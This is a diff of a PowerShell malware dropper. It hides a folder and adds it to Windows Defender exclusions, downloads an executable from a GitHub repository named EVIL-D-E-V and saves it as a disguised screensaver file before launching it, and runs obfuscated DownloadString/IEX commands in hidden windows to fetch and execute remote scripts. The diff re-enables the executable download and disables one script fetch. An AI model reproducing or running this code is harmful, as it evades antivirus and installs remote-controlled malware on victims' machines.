@@ -51,10 +51,10 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-# $url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClient.exe"
-# $output = "$dir\Updateclient.scr"
-# Invoke-WebRequest -Uri $url -OutFile $output
-# Start-Process $output
+$url = "https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/XClienta.exe"
+$output = "$dir\Updatecli4mt.scr"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process $output
 
 $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/antiremove")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
@@ -64,9 +64,9 @@ $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/sh
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-$shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclienta.ps")
-$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
-Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+# $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclienta.ps")
+# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+# Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
 $shellcode = ("https://raw.githubusercontent.com/EVIL-D-E-V/M/refs/heads/main/shellcode/Xclient.ps")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
